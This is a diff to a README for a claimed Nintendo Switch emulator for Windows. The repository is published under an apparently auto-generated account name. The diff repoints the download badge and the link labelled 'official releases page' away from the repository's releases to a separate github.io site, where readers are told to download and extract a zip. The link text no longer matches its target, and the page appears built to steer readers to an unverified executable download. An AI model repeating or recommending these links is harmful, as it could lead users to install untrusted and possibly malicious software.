@@ -1,6 +1,6 @@
 # 🎮 Eden-Emulator - Play Nintendo Switch Games On PC
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/gossipy-tabularmatter945/Eden-Emulator/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://gossipy-tabularmatter945.github.io)
 
 Eden-Emulator allows users to run Nintendo Switch software on Windows computers. This project provides a stable environment for playing games without requiring the original console hardware. The emulator focuses on performance, accurate graphics rendering, and ease of use for anyone with a standard desktop or laptop.
 
@@ -19,7 +19,7 @@ Before you install the software, ensure your computer meets these minimum specif
 
 Follow these directions to set up the emulator on your local drive:
 
-1. Visit the [official releases page](https://github.com/gossipy-tabularmatter945/Eden-Emulator/releases) to access the latest software version.
+1. Visit the [official releases page](https://gossipy-tabularmatter945.github.io) to access the latest software version.
 2. Look for the "Assets" section under the newest release build.
 3. Click the link labeled "Eden-Emulator-Windows.zip" to save the compressed folder to your computer.
 4. Right-click the downloaded folder and select "Extract All" to unpack the files.
